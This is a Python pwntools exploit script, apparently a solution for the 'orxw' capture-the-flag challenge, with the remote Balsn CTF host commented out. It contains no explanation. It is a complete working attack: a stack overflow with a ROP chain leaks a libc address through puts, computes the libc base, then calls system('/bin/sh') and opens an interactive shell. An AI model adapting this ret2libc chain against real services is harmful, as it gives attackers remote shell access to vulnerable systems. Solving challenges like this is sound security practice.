from pwn import *
import os
import random
import time

context.binary ='./orxw'
elf=context.binary
libc = ELF('./libc.so')
context.log_level = "DEBUG"

gs = '''
break *0x401573
'''

# cmp canary 0x5555555556e5

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        # return remote('orxw.balsnctf.com', 19091)
        return process(elf.path)

print(elf.plt)
print(elf.symbols)
p=start()

## GADGETS

POP_RDI=next(elf.search(asm("pop rdi; ret")))
log.info('POP_RDI')
print(hex(POP_RDI))
# $rsp 0x7fffffffdeb0
# 0x7fffffffdebe:	pop    rdi


# ================================ GET LEAK =========

c=cyclic_metasploit(100)
padd=24
p.sendlineafter(b'Can you defeat orxw?',b'A'*padd+p64(POP_RDI)+p64(elf.got['read'])+p64(elf.symbols['puts'])+p64(elf.symbols['main']))
p.recvline()
p.recvline()

recieved = p.recvline().strip()
leak_libc = u64(recieved.ljust(8, b"\x00"))


# leak_libc=p.recvline()[:-1]
# leak_libc=[ hex(x) for x in list(leak_libc) ]
# leak_libc="".join(leak_libc[5]+leak_libc[4]+leak_libc[3]+leak_libc[2]+leak_libc[1]+leak_libc[0]).replace('0x','')
# leak_libc=leak_libc[:-2]+'00'
# leak_libc=int(leak_libc,16)
# leak_libc=int('0x'+("".join(leak_libc[5]+leak_libc[4]+leak_libc[3]+leak_libc[2]+leak_libc[1]+leak_libc[0]).replace('0x','')),16)
log.info('leak_libc')
# print(hex(leak_libc))
print(hex(leak_libc))


#  ================================ CALCULATE LIBC BASE =========

libc.address=leak_libc-libc.symbols['read']

log.info('LIBC BASE')
print(hex(libc.address))
BINSH = next(libc.search(b"/bin/sh"))
# p.sendlineafter(b'Can you defeat orxw?',b'A'*padd+p64(libc.address+0xe6c7e))
p.sendlineafter(b'Can you defeat orxw?',b'A'*padd+p64(POP_RDI)+p64(BINSH)+p64(libc.symbols['system'])+p64(elf.symbols['main']))


p.interactive()